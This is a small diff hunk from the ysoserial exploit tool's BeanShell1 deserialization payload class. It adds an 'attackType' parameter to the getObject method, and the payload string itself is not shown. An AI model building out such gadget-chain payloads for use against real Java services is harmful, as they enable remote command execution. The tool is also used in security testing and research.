@@ -24,7 +24,7 @@ import ysoserial.payloads.util.PayloadRunner;
 @Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
 public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
 
-    public PriorityQueue getObject(String command) throws Exception {
+    public PriorityQueue getObject(String command, String attackType) throws Exception {
 	// BeanShell payload
 
         String payload =
